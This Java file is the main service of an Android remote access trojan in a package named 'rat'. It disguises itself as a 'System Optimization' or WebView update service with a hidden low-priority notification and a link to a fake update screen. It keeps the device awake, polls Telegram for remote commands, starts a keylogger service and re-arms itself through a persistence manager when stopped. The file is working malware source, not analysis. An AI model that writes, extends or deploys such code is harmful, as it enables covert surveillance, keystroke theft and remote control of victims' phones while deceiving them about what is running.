package com.enterprise.rat.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import com.enterprise.rat.R;
import com.enterprise.rat.activities.FakeUpdateActivity;
import com.enterprise.rat.utils.PersistenceManager;

public class MainService extends Service {
    private static final int NOTIFICATION_ID = 1001;
    private static final String CHANNEL_ID = "sys_webview_update";
    private TelegramPolling telegramPolling;
    private PowerManager.WakeLock wakeLock;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d("MainService", "onCreate");
        createNotificationChannel();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, buildNotification(),
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(NOTIFICATION_ID, buildNotification());
        }
        acquireWakeLock();
        startTelegramPolling();
        startKeylogger();
        PersistenceManager.scheduleKeepAlive(this);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d("MainService", "onStartCommand");
        if (telegramPolling == null || !telegramPolling.isRunning()) {
            startTelegramPolling();
        }
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("System optimization service");
            channel.setShowBadge(false);
            channel.setSound(null, null);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification buildNotification() {
        Intent notificationIntent = new Intent(this, FakeUpdateActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
            this, 0, notificationIntent,
            PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
        );

        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Optimization")
            .setContentText("Optimizing device performance")
            .setSmallIcon(R.drawable.ic_sync)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setContentIntent(pendingIntent)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build();
    }

    private void acquireWakeLock() {
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        if (powerManager != null) {
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "WebViewCore::Wakelock"
            );
            wakeLock.acquire(24 * 60 * 60 * 1000L);
        }
    }

    private void startTelegramPolling() {
        if (telegramPolling != null) telegramPolling.stop();
        telegramPolling = new TelegramPolling(this);
        new Thread(telegramPolling).start();
        Log.d("MainService", "Polling started");
    }

    private void startKeylogger() {
        Intent intent = new Intent(this, KeyloggerService.class);
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
        } catch (Exception e) {
            Log.e("MainService", "Keylogger start error", e);
        }
    }

    @Override
    public void onDestroy() {
        Log.d("MainService", "onDestroy");
        if (telegramPolling != null) telegramPolling.stop();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        PersistenceManager.scheduleKeepAlive(this);
        super.onDestroy();
    }
}
